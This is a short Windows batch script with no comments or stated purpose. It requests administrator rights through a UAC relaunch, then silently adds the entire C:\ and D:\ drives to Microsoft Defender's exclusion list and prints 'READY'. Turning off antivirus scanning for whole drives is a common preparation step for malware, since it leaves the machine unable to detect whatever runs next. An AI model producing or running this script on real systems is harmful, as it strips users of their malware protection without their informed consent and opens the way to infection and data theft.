@echo off

net session >nul 2>&1
if %errorLevel% == 0 (
    goto :is_admin
) else (
    goto :request_admin
)

:is_admin
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1


powershell -Command "Add-MpPreference -ExclusionPath 'D:\'" >nul 2>&1

powershell -Command "Write-Host 'READY' -ForegroundColor Red; pause"

exit

:request_admin

powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
exit
